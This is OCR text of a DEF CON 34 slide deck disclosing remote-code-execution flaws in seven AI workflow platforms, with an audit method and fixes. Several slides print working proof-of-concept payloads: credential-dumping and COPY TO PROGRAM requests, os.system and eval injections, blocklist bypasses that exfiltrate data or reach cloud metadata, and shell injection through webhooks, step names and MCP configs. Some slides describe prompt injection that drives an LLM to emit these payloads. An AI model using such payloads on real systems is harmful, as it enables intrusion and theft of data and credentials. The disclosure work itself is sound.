---
title: "Hacking Your Life with AI Can Get You Hacked How AI Orchestration Platforms Ship RCE by Design"
speakers: ["Peyton Kennedy"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: null
source_pdf: "DEF CON 34/DEF CON 34 - Peyton Kennedy - Hacking Your Life with AI Can Get You Hacked How AI Orchestration Platforms Ship RCE by Design - V1.pdf"
pages: 58
sha256: "0547f8584cf951c80ee246a8d42baa402c91734fbbdb7ae36b6ee89c8937c28e"
text_chars: 27908
ocr_pages: 58
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T00:27:03Z"
---
# Hacking Your Life with AI Can Get You Hacked How AI Orchestration Platforms Ship RCE by Design

**Speakers:** Peyton Kennedy  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Peyton Kennedy - Hacking Your Life with AI Can Get You Hacked How AI Orchestration Platforms Ship RCE by Design - V1.pdf` (58 pages)


## Slide 1

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DEF CON 34
Hacking Your Life
with Al Can
Get You Hacked
How Al orchestration platforms ship RCE by design
Peyton Kennedy +: p8Q@n-sec +: Endor Labs
```

## Slide 2

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
THE ASSUMPTION BEHIND ALL 7 PLATFORMS
“Anyone who can touch a workflow is
trusted to run code on the host.”
```

## Slide 3

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
whoami
The hunt
an 7 13 a
Peyton Kennedy
Senior Security Researcher platforms findings languages
Endor Labs audited disclosed Java - Python : TS + Go
```

## Slide 4

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Section 1 - The attack surface
What Al orchestration platforms are
Trigger LLM node Code node Output
— — —_
webhook + schedule prompt + agent python - js action - deploy
Drag-and-drop workflows with LLM nodes, Webhooks, and
connectors. Deployed as critical infrastructure.
Nocobase_ 1S
Dify Go-Py
Apache Airflow
Flowise
TS: Py
Activepieces 1S
Python
Langflow
Kestra Java
Python
```

## Slide 5

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
@5
Why these matter: reachability, not popularity
The steps are where the danger lives
Built-in functions
http - fetch - db query
Trigger Custom functions
webhook : schedule - chat user code on the host
—
LLM node Data modules
prompt - agent output sql + orm + migrations
Integration modules
internal APIs + secrets
@ Cloud credentials
G=] Code execution, root
= Production databases
é Internal network + vaults
```

## Slide 6

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The spine of this talk
Aspectrum: from accidental to intentional
ACCIDENTAL INTENTIONAL
ACCIDENTAL LLM AS CODE WRONG PHASE INTENTIONAL
Tried to build security but shipped it Trusted LLM output as executable Built or applied a sandbox but to the Don't sandbox, “it's your problem.”
broken. code. wrong phases. Kestra « Airflow
Nocobase Flowise - Langflow Dify - Activepieces
```

## Slide 7

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Central thesis
The boundary they assumed vs what they got.
UNTRUSTED + WHO CALLS IT
4 Unauthenticated webhook
= Low-privilege user
& Internal-network caller
© Asingle config flag
Assumed: author-only access. Actual:
TRUST BOUNDARY THE VENDOR ASSUMED - “THE WORKFLOW AUTHOR IS TRUSTED”
Workflow execution engine Host
eval() + exec() - subprocess OS - DB: secrets : uid 0
anyone who can reach the engine gets the host.
```

## Slide 8

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
8
Nocobase - accidental end cp
Nocobase: the “we tried” End —Necobase s/o sisk-#2wa-r3jw-sesh
DEFENSE 01 DEFENSE 02 DEFENSE 03
Built a sandbox Built input validation Built a Proxy guard
SES Compartment preprocessor scrub context wrapper
X lock commented out X string matching X leaks private field
Defenses are present, just a bit broken.
```

## Slide 9

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
9
Nocobase « accidental end ce —
One endpoint, lowest privilege Neovobase tise sisa-aacrsiw-sesn |
POST /api/variables:resolve
Evaluates user template expressions inside an SES Compartment.
+ Resolves placeholders in workflow config
+ Pulls in record fields, dates, current-user values
+ Lets automations reference live data
+ Legitimate templating, nothing more
// packages/plugins/@nocobase/p lugin—f low—engine/src/server/plugin.ts:40
this.app.acl.allow('variables', 'resolve', 'loggedIn'); «+ any logged-in user
The lowest-privileged account can reach the sandbox.
```

## Slide 10

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
10
Nocobase - accidental end pe
Three failures stack Nocobase | TS/Node GHSA-42wx-r3jw-6c5h
Layer 1 - Preprocessor string matching
one request
Layer 2 - Proxy guard leaks private field |
full DB + OS
Layer 3 - SES lockdown commented out
Defense in depth to defeated in depth.
```

## Slide 11

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
11
Nocobase + accidental end Cp
Failure #1: the preprocessor is string matching | vse ts ssr-sau-rsie-sesn
// resolver.ts:198 scrubs "ctx." and "ctx[" with indexOf ()
// rename ctx inside an arrow fn and it's invisible:
((c) => c.koaCtx.app.db.sequelize.query('SQL'))(ctx) «+ "c.koaCtx" # "ctx."
Alias ctx and the rewriter never sees it.
BIND TO A NEW NAME DESTRUCTURE IT OUT BUILD THE ACCESS
(ce) => c, koaGtx..) (etx) { koaCtx } = ctx ctx ["koa"+"Ctx"]
A textual scan over "ctx." is a lexical filter on a semantic property. Renaming is free in JavaScript, so the scan can never enumerate the paths
that reach the context.
```

## Slide 12

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Nocobase - accidental end Cp
Whatis SES (Secure ECMASCript)? | nocobase tsinoie ) ( cisa-42ue-r3jw-6esh
Hardened-JS isolation. Agoric's Endo project, the basis for TC39 Compartments.
import 'ses';
lockdown(); // freeze the intrinsics
const box = new Compartment({}); // no ambient authority
box.evaluate(userExpr); // only what you pass in
In-process JS isolation by capability, not by container.
hardened intrinsics - lockdown()
Compartment
fresh global
>) ( +) endowment: only what you hand in
userExpression
®@ no ambient authority | @ filesystem é network = database © outerscope
SAFE ONLY IF SAFE ONLY IF
(1) Lockdown () is called — Failure #3 (2) no powerful object leaks in — Failure
#2
lla
```

## Slide 13

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
12
Nocobase + accidental end Cp
Failure #2: the Proxy leaks the private field ocovase ss/moie _sisa-aawx-r3jw-sesh
// contexts.ts:106
this._proxy = new Proxy(this, {
get: (target, key, receiver) => {
if (Reflect.has(target, key)) { «+ true for the This breaks obligation #2
"private" koaCtx
SES stays safe only if no powerful object crosses in. The Proxy is exactly that
. boundary, and it leaks.
const v = Reflect.get(target, key, receiver);
return typeof v === 'function' ? v.bind(target) : v;
} koaCtx is a live handle to the Koa request, and through it ctx. app. db, the Sequelize
instance, and the full runtime.
ho
ys
leaked koaCtx —» app.db.sequelize -—» | .query()>DB
TS private compiles to a normal property. The guard was meant to be the
endowment boundary, so this hands a powerful object straight into the
compartment.
```

## Slide 14

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
13
Nocobase -
accidental chd OD
LeekdewnH-
Failure #3: the lock is commented out
// resolver.ts:14-25
| // \ockdown(); // TODO «+ SES intrinsic hardening: disabled
They had the control and disabled the lock.
```

## Slide 15

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
14
Nocobase « accidental end Cp
The exploit: one request, full DB — OS | recovase rs/iose | sist-a2wn-r3jw-6esh
os
. . . dump + password COPY ...TO
memberlogin | — POST variables:resolve —» _ sequelize.query() —> command
Tiles et i anil users _hashes PROGRAM cue
POC 1 + DUMP CREDENTIALS
POST /api/variables: resolve HTTP/1.1
Host: TARGET: 13000
Authorization: Bearer $TOKEN # member role
Content-Type: application/json
{"values":{"template":"{{ ((c)=>c.koaCtx.app.db.sequelize.query(\"SELECT id,email,password FROM users\")) (ctx) }}"}}
The users table, hashes included, in the response.
POC 2 + ESCALATE TO OS
POST /api/variables: resolve HTTP/1.1
Host: TARGET: 13000
Authorization: Bearer $TOKEN # member role
Content-Type: application/json
{"values":{"template":"{{ ((c)=>c.koaCtx.app.db.sequelize.query(\"COPY (SELECT 1) TO PROGRAM ‘id > /tmp/pwned'\")) (ctx) }}"}}
Postgres COPY .. TO PROGRAMruns a shell command on the host.
```

## Slide 16

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
15
Nocobase « accidental end Cp
Three companion findings: same failure Mode _%2<0b2s2 1s
Stored XSS — account
takeover
flow-engine + flowI18n.ts:73 - CWE-79/95 : <
2.0.32
8.7 HIGH
// compileTemplate() on a stored title
new Function('$root', ‘with($root){
return (${optionsStr}); }*)({})
// empty {} > lookups fall through to
window
1 Builder writes a poisoned tit le via
flowModels: save
2 Any loggedIn user renders it, payload fires in their
browser
3 fetch() exfiltrates the JWT from LocalStorage
Admin token = full control. Payload can re-save itself >
self-propagating worm.
SQLi via validator gap 7.2 HIGH
plugin-collection-sql - CWE-89 + CVE-2026-41641
checkSQL() on collections:create v
checkSQL() on sqlCollection:execute v
checkSQL() on sqlCollection:update x
missing
1 Create a SQL collection with benign SELECT 1,
passes
2 updateittoSELECT *« FROM users, no validation
3 : list the collection > rows returned
Hashes dumped; on PostgreSQL db link /
pg_read_file reach other DBs & host files.
SQLi via recursive CTE 7.5 HIGH
@nocobase/database - eager-loading-tree.ts:59 -
CVE-2026-41640
// nodeIds are row primary keys
. WHERE id IN
('${nodeIds.join("','")}')
// string PK concat + injected UNION
branch
1 Create atree collection with st ring primary keys
2. Insert a record whose PK is a UNION
3 pay'g?dively=true load — error-based extraction
Credential dump confirmed; on PostgreSQL superuser
COPY ... TO PROGRAM reaches OS exec.
```

## Slide 17

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Nocobase sets the floor
Apermissive threat model emerges when
velocity > review.
Sometimes, due to classic vulnerabilities.
```

## Slide 18

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LZ
Flowise -
Langflow: LLM as code
Section 2.2 - Anew injection class
LLM output == user
We spenta “input: ) user input.
```

## Slide 19

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
18
Flowise - Langflow: LLM as code i
Aregex blocklist for LLM Python Fowise tsrvsise | sust-w7<8-a2ap-seag
# validatePythonCodeForDataFrame(): reject on match
38 /\bimport\b/
/\beval\sx\ (/
regex patterns /\bos\./
onthe blocklist # .. 35 more. Accept everything else.
Reject on match. Accept everything else.
```

## Slide 20

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
19
Flowise - Langflow: LLM as code Oe
The fatal setup: the executor pre-imports the Fionines (Teemyodian)  ( sh-wfst-atoe-fepo
danger
Before running LLM code, executor prepends:
Entire pandas / numpy API reachable, with no import keyword in the
import pandas as pd output.
import numpy as np
Block imports all you want. The dangerous API is already in scope.
```

## Slide 21

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
20
Flowise - Langflow: LLM as code i
One blocklist, Six Ways ArOUN It | Fowise rvs | stsa-w7x8-a29p-seas
A 38-pattern regex blocklist, and the payloads that walk straight through.
VERDICT PAYLOAD
( / BYPASSED ) pd. read_json("http://.."+df.to_json() )
(V BYPASSED ) pd. read_csv("http://169.254.169.254/...")
( ‘YBYPASSED ) pd. read_html("http://.."+df.to_html() )
(V BYPASSED ) np.ctypeslib. load_library (...)
(VBYPASSED ) chr(101)+chr(118)+chr(97)+chr(108)
( VBYPASSED ) importlib
X BLOCKED import os
Blocklists enumerate the bad. The bad is unbounded.
WHAT IT GETS YOU
Full dataset exfiltration
SSRF — cloud metadata creds
Exfil, a different function
Native library load
Builds "eval" at runtime - RCE
\bimport\b never fires (t—l)
The one literal control case
```

## Slide 22

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Flowise - Langflow: LLM as code Oe
The patch was a bandaid, not a fix "wise ‘srs | sHsa-w7x8-a2p-seas
21
The prior patch tightened a regex for a technique this bug never used:
ZDI patch (<3.0.13) This bug (3.1.0-3.1.2)
Technique import aliasing pre-imported pd/np
Needs import Yes No
Caught by /\bimport\b/ Yes No
Complexity moderate trivial
But the version number was never the point.
Abigger blocklist can't fix this
Badness is unbounded. Build eval from chr(), reach it via getattr, alias it, enter
through another pre-imported lib. You can't enumerate an infinite set.
The capability is the bug. LLM-steerable code is handed a full CPython runtime:
network, filesystem, every in-scope dataset. No string filter makes that safe.
The fix isn't a longer list. Don't hand untrusted code dangerous capability. Use an AST
allowlist, no ambient authority.
It patched the symptom. The real issue is a threat model that treats model-generated code as safe enough to
execute.
```

## Slide 23

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Flowise : Langflow: LLM as code a
Live demo
Flowise Prompt Injection to Code Execution and
Dataset Exfil
```

## Slide 24

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Flowise - Langflow: LLM as code Oe
Full chain: unauthenticated prompt — RCE / exfil ‘owise service | sisawx8-a2gp-seay
01 + ENTRY 02 + INJECT 03 - GENERATE 04 + VALIDATE 05 + EXECUTE @6 + IMPACT
Unauth POST Prompt injection LLM emits Validator Pyodide runs it Dataset —
/api/v1/prediction/< | —* in the chat message | —> bypass code — PASSES — | full cPython, in- — attacker
Wutdes chr()-built eval regex sees no banned UES exfil over the
token network and RCE
No auth in the way The guard is a string check Pyodide + sandbox
Flowise ships unauthenticated by Validation runs onthe codeas text, before It's full CPython in the server process: fetch,
default and even IF auth is execution. The LLM assembles the payload filesystem, and every in-scope dataset are
configured, the at runtime. reachable.
/api/v1/predection/UUID path has
no auth, triggering the same code
Single prompt. Full compromise. No authentication.
```

## Slide 25

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
23
Flowise - Langflow: LLM as code Oe iw
Langflow: same story, simpler bypass ‘2s'ow | sts«-stpn-sass-204
# lambda_filter.py, the ENTIRE validation:
def _validate_lambda(self, t): return t.strip().startswith("lambda") and ":" in t
fn = eval(lambda_text) + eval() on LLM output
Starts with “lambda,” has a colon. That's it.
```

## Slide 26

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Flowise + Langflow: LLM as code Oe iw
Live demo
Langflow Lambda trouble: Chat transform to Shell
```

## Slide 27

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
23b
Flowise - Langflow: LLM as code Oe iw
What the demo showed: one chat message — shell | +2»10w ro») stsa-sfpn-344s-2ve4
1 Open the Langflow chat
a flow with a Smart Transform / Lambda Filter node, no code editor, no API
| |
2 Send one chat message
drives the node to emit lambda x: __import__('os').system('id')
3 The validator passes |
entire check: startswith("lambda") and ":" in t
4 eval() runs the lambda
fn = eval(lambda_text), arbitrary Python on the host
5 Calculator!!!
open -a Calculator runs without any error
```

## Slide 28

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Flowise - Langflow: LLM as code Oe iw
custom_component: exec ( ) on user Langflow Python) (GHSA-Bxre-2}r4-78]7
Python
the endpoint
POST /api/v1/custom_component
PoC +: payload in __init__
accepts a JSON "code" field of raw Python
class RCE(Component) :
def __ init__(self, *xkw):
super().__init__(*kkw)
the sink - validate. py:442 os.system('touch /tmp/pwned') ~« on validate
exec(compiled_class, exec_globals, exec_locals) «+
no sandbox
```

## Slide 29

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
25
Flowise - Langflow: LLM as code Oe iw
MCP server config: shell metacharacter injection ‘2s!0w ry sisa-w7s4-rj3p-xv45_)
; ; PoC - POST /api/v2/mcp/servers/{name}
the sink : mcp/util.py
"command": "python3",
"args": ["=e",
"$(touch /tmp/mcp && echo print(123))"]
full_command = " ".join([command, *args]) «
unsanitizedStdioServerParameters(command="bash",
args=["-c", f"exec {command_str}"]) + via shell
$() runs on the host first; print(123) keeps python valid
Fires the moment an MCP Tools node selects the server. Command substitution on the host.
```

## Slide 30

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Flowise - Langflow: LLM as code Oe iw
Langflow's trust boundary is one flag deep = 2"s'0w
MCP config injection
post-auth by default
custom_component exec ()
post-auth by default
Smart Transform eval ( )
post-auth by default but can be pre-auth depending on trigger
flip one env var
LANGFLOW_SKIP_AUTH_AUTO_LOGIN=t rue
One env var flips “trusted user” to “anyone.”
~ pre-auth RCE
```

## Slide 31

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Flowise -
Langflow: LLM as code Oe iw
Section takeaway
Regex blocklists can't secure a pre-imported API.
Trivial validators can't constrain an LLM.
Fix = AST allowlisting or PROPER sandboxing. None of them have it.
```

## Slide 32

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Dify -
Activepieces: wrong phase ee _ )
Section 2.3 - Asandbox is not a sandbox
The right primitive, activated one phase too late
Every “sandbox” here is the same job under different names: block dangerous syscalls (seccomp), fake the filesystem root
(chroot), drop out of root (setuid), plus in-process cages (a V8 isolate, a WASM runtime). Different mechanisms, one purpose:
cage the code.
PHASE 1 - BOOTSTRAP PHASE 2 - THE REAL SANDBOX ACTIVATES
Attacker'scoderunshere -_, seccomp + chroot + setuid / V8 isolate
uid @ + no seccomp - full host now everything is confined: too late
The isolation is real. |t just runs after the attacker.
```

## Slide 33

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
29
Dify - Activepieces: wrong phase i s( @ Si
Dify: the bootstrap ordering > ~~
# internal/core/runner/python/prescript.py
os. chdir(running_path)
| {{preload}} «- runs as ROOT: no seccomp, no chroot
lib.DifySeccomp({{uid}}, {{gid}}, {{enable_network}}) « confinement happens AFTER
| with os.fdopen(3,"rb") as code_fd: « user code (finally sandboxed)
code = code_fd.read().decode("utf-8")
The sandbox protects everything except the thing the attacker controls.
```

## Slide 34

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
30
Dify - Activepieces: wrong phase  ¢iss( @ Sei
The timeline «iy «ye
DANGER ZONE - unconfined
+ preloadruns as uid 0
+ CapEff = full capability mask
+ NoNewPrivs = Q,noseccomp filter
2 attacker payload lands here
Attacker code executes in the unconfined zone.
see eee ee ee = = = DifySeccomp()
SAFE ZONE - confined
+ chroot+seccomp+setuid
+ Only user code runs here, fully confined
```

## Slide 35

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Dify - Activepieces: wrong phase i s( @ Si
PoC: read /etc/sShadowas root © diy «0»
POST /v1/sandbox/run enable_preload = true X-Api-Key: dify-sandbox
REQUEST RESPONSE — RUNS BEFORE THE SANDBOX DROPS
POST /v1/sandbox/run HTTP/1.1 {"code":0,"message":"success","data":{
Host: localhost:8194 Nennares, stdout:
X-Api-Key: dify—sandbox euidmaee
Content-Type: application/json
{ Uid: 0000
"Language": "python3", CapEff: 0000000a80425fb
"code": "def main(): return {}", NoNewPrivs: 20
"preload": "import os,subprocess; id = uid=0(root) gid=0(root)
print(\"euid =\", os.geteuid());
print (open(\"/etc/shadow\"). read()
.splitlines()[:1])", Ht
“enable_network": true
p
shadow = ['root:*::0:99999:7:::']
Reproduced against dif y—sandbox: 0.2.15. The preload string runs as uid 0, before Dif ySeccomp() ever fires. ( default X-Api-Key = dify-sandbox 7
```

## Slide 36

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Dify - Activepieces: wrong phase ee _ )
Persistence: poison python . SO © dity «ye
attacker writes — Run #2 (other tenant)
/var/sandbox/sandbox—python/python. so — Run#s3
every run: ctypes.CDLL("./python.so") —z Run #N
+ preloadruns as root before the sandbox drops privileges, so it can write anywhere
+ python. sois reloaded every run via ctypes.CDLL( ), with no integrity check
+ The path is shared across runs, so the implant reaches other tenants’ executions
One exploit = persistent root over every future run, including other tenants’.
```

## Slide 37

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Dify - Activepieces: wrong phase i s( @ Si
Dify: where the trust boundaries actually sit > «~~
ssrf_proxy_network +: internal, no host route
dify-sandbox : 8194
=> ssrf_proxy
USER CODE : Code node
A v seccomp + chroot + uid/gid drop - caps
Ly boundary B leaks — raw TCP sockets bypass squid
api: 5001
/inner/api + committed default key
plugin_daemon : 5002
control-plane + dual-homed 1
| default network
postgres + redis + vectordb — unreachable from sandbox; plugin_daemon bridges in
it.
intended squid : 3128 > internet :
| A | User code — sandbox HOLDS
seccomp default-KILL, chroot, uid/gid + caps drop. No default-config
escape found.
B Sandbox — internal net LEAKS
SANDBOX_ENABLE_NETWORK=true by default. Raw sockets reach api &
plugin_daemon directly.
C Squid as egress gate BYPASSED
The proxy only governs traffic that opts in. Nothing forces sandbox
traffic through it.
```

## Slide 38

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Dify : Activepieces: wrong phase ee _ )
The fix is one line but they accepted the risk >) «=
the one-line fix maintainer response | CLOSED - WORKING AS DESIGNED
+ Raisedin issue #27, preload disabled by default in PR #96. Known since
| + lib.DifySeccomp(uid, gid, net) # move above ae
+ “A privileged bootstrap for trusted code. Enabling it intentionally changes the
{{preload}}
trust model.”
| - lib.DifySeccomp(uid, gid, net) # was here, too late
+ Not reachable via the sandbox API or a normal user and an operator must edit
the deploy config. Risk passed to the deployer.
my rebuttal
“Trusted via config” breaks when that code arrives over an HTTP request with one
Drop seccomp + chroot before the preload string runs. The whole risk class j
auth header and runs as uid 0.
disappears
```

## Slide 39

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
35
Dify : Activepieces: wrong phase ee  _)
Activepieces: same mistake, one layer Up —*xtverieces tse sust-arsn-e2j7-rs2e
index.js (compiled):
var child_process = require("child_process");
child_process.execSync("whoami") ; «+ top-level: runs in host engine (NO isolate)
fs.writeFileSync("/tmp/proof", data);
exports.code = async (inputs) => {...} «+ ONLY this goes to the V8 isolate (too late)
importFresh() = require().Top-level code runs before the isolate exists.
Co-reported with Aviral2642 - qluf3ng
```

## Slide 40

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
36
Dify : Activepieces: wrong phase ee  _)
Secrets out of a “sandboxed” step *tiverieces tomose | stsk-grsn-eaj7-rszg |
{ "executionMode": "SANDBOX_CODE_ONLY", “user": "root",
"id": "uid=@(root) gid=@(root)",
"ENCRYPTION_KEY": "82244b..", "JWT SECRET": "ZVCRICW5q..." }
AP_ENCRYPTION_KEY + AP_JWT_SECRET read despite SANDBOX_CODE_ONLY.
```

## Slide 41

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
37
Dify - Activepieces: wrong phaSe@ a @ Sei
Command injection via the step Activepieces (Ts/tiode ) ) ( Gish-spfy-seap-5tvs
name
step name
: = bun build ${path}/index.ts —> execPromise —> /bin/sh -c
z.string()
PoC - the Code step
step:
type: CODE
name: "; touch /tmp/pwn; #" «+ concatenated into bun
build
code: “export const code =..
Co-reported with kodareef5 + Aviral2642
```

## Slide 42

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Dify - Activepieces: wrong phaSe@ a @ Sei
Section takeaway
Areal isolation primitive applied to the wrong
phase.
Whatever runs first becomes the attack surface.
```

## Slide 43

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
39
Airflow -
Kestra: intentional end EEE © ©
Section 2.4 « “Working as intended”
“That's intended behavior. Security is the deployer's problem.”
Don't sandbox. Don't validate. “The workflow author is trusted.”
```

## Slide 44

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Airflow - Kestra: intentional end ee  _ )
Airflow: trigger # author sr2cheairiow yo» cve-2026-30898
# providers/standard/operators/bash. py: 235
| subprocess.run(["bash", "-c", self.bash_command], ...) « rendered conf, unescaped
1 + the DAG an author ships 2 + PoC « trigger the DAG
from airflow.operators.bash import BashOperator POST /api/v1/dags/notify/dagRuns
BashOperator ( ie Content-Type: application/json
task_id="notify",
bash_command="echo {{ dag_run.conf['msg'] }}", {"conf": {"msg": "$(id)"}} © runs on the worker
) « renders trigger-time conf
Standard trigger permission — author's code-exec privilege.
```

## Slide 45

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
41
Airflow - Kestra: intentional enc eee iii @ Sa
Documentation as attack Surface *recheririow ryenon | cve-2026-30898
core—concepts/dag-run. rst operators/bash.rst
NO WARNING CAUTION BLOCK
“escaping and sanitization of the Bash
bash_command="echo value: command is not performed.”
{{ dag_run.conf['conf1'] }}" +
sink
The getting-started example teaches it as the Same pattern, marked unsafe, with an env=
primary pattern. alternative.
the "fix" - PR apache/airflow#64129 shipped Airflow 3.2.0 : 2026-04-07
- bash_command="echo value: {{ dag_run.conf['conf1'] }}"
+ env={"message": '{{ dag_run.conf["message"] }}'} + value never enters the command string
operators/bash.py docstring
“DO NOT DO THIS”
The same pattern a third time, with an explicit
“do not do this.”
Ships a safe alternative right beside it.
The getting-started guide taught the bug. A developer copies the first example and never reaches the warning.
```

## Slide 46

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Airflow - Kestra: intentional enc eee iil @ a>
Kestra: two 9.8s, both closed “intended” | «sta >=
interpreter
Property<List<String>> » dynamic Pebble
ProcessBuilder.command() - no validation
host exec, no shell needed
interpreter: ["/usr/bin/python3","-c",
"import os; os.system('touch /tmp/pwned')"]
maintainer: “intended functionality”
beforeCommands
L
webhook body (unauth)
Pebble render
Collectors. joining concat
/bin/sh -c single string
beforeCommands: ["echo {{ trigger.body.command }}"']
« webhook-controlled
```

## Slide 47

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
43
Airflow - Kestra: intentional enc eee iil @ a>
The “trusted author” argument collapses | «s 2~
1 + the flow an author ships 2 + PoC + unauthenticated webhook
id: rce_via_beforecommands POST /api/v1/executions/webhook/default/
triggers: rce_via_beforecommands/test123
— type: core.trigger.Webhook
key: test123 —%, Content-Type: application/json
tasks:
— type: scripts.shell.Commands {"command": "hello; touch /tmp/pwned"}
beforeCommands: the host
- "echo {{ trigger.body.command }}"  «
Pebble sink
Webhooks are unauthenticated by default. The boundary they invoke doesn't exist.
- runs on
```

## Slide 48

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Live demo
No account. Just a webhook.
```

## Slide 49

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
43b
Airflow - Kestra: intentional enc eee iil @ a>
What the demo showed: no account, just a webhook | testa >
1 A flow already exists
webhook trigger + beforeCommands, authored once by any user
2 Send an unauthenticated POST
curl .../executions/webhook/default/rce_via_beforecommands/test123, no account
3 The command is injected
{"command":"hello; touch /tmp/pwned; echo done"} ~ concatenated into /bin/sh -c
4 Kestra executes it on the host
runs outside any auth boundary
5 Proof: command runs on the host
/tmp/pwned appears; output in the execution log
```

## Slide 50

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Section 3 - Pattern analysis
Five patterns, mapped to the spectrum
ACCIDENTAL INTENTIONAL >
a 2 8 4 5
Velocity outpacing LLM output trusted as Sandbox escape via Trust boundary Documentation as
review code execution ordering mismatch attack surface
Nocobase Flowise - Langflow Dify - Activepieces Kestra - Langflow flag - Airflow
Airflow trigger
```

## Slide 51

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The realization
These are multi-tenant code-execution environments,
shipped as single-user dev tools.
```

## Slide 52

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Section 4 - Methodology
The 5-step audit method
CISIGIOl®
Map input surfaces. webhooks - APIs - Ul forms - LLM outputs - triggers
Trace input — code exec. templates - exec/eval - ProcessBuilder - subprocess - sandbox bootstraps. Read the bootstrap and
order.
Documented threat model vs actual trust boundaries.
Can low-priv / unauth callers reach exec? the lowest caller is lower than you think.
Check the docs for vulnerable patterns taught as usage.
```

## Slide 53

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Why it survives
Different everything, same five steps
Platform
Nocobase
Flowise
Langflow
Dify
Activepieces
Kestra
Apache Airflow
Java : Python : TS - Go. Different engines, different sandboxes. The patterns repeat.
Language
TS/Node
TS + Pyodide
Python
Go + Python
TS/Node
Java
Python
Template / engine
SES Compartment
regex blocklist
startswith() check
preload script
importFresh()
Pebble
Jinja2
Sandbox approach
JS intrinsics (lock off)
Pyodide / WASM
none - eval()
seccomp + chroot + setuid
V8 isolate
none « ProcessBuilder
none - subprocess
```

## Slide 54

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
48
Section 5 - Conclusion
It's the threat model, not the patch
ACCIDENTAL INTENTIONAL >
Guards that don't fire Sandboxes that don't Validators the LLM walks Docs that teach the bug
sandbox around
```

## Slide 55

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Takeaways
If you deploy any of these: workflow access = a shell on your host
Treat the trigger endpoint like an exposed SSH port.
/dagRuns
Scope perms as code-exec, not “just a workflow.” Trigger permission = the author's code privilege
Kill the dangerous default flags. SANDBOX_ENABLE_NETWORK - LANGFLOW_SKIP_AUTH_AUTO_LOGIN -
enable_preload
Audit every trigger path. Use the 5-step method
CK) OO) &
Assume compromise persists across runs. Check shared sandbox paths for a planted . so loader
Put auth in front of it. Trigger paths are unauthenticated by default: /prediction - /executions/webhook -
Flowise Kestra
Airflow
Dify
Airflow
Kestra
Langflow
Allseven
Dify
```

## Slide 56

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Until vendors admit these are code-execution platforms
and secure them accordingly, these bugs will keep
shipping.
By design.
```

## Slide 57

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Thank you.
Peyton Kennedy
github. com/p80n-sec
Questions?
p8@n-sec - Endor Labs
Linkedin. com/in/peytonkennedysecurity
```

## Slide 58

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Appendix Al
Full vulnerability inventory
Platform
Nocobase
Nocobase
Nocobase
Nocobase
Flowise
Langflow
Langflow
Langflow
Dify
Activepieces
Activepieces
Kestra
Kestra
Apache Airflow
Al
Finding
SES escape — SQL/RCE via variables: resolve
s 2.0.32 + resolver.ts:198
Stored XSS via compileTemplate( )
< 2.0.32 + flowI18n.ts:73 + with({})-window
SQLi, checkSQL missing on update
s 2.0.32 + sqlCollection: update
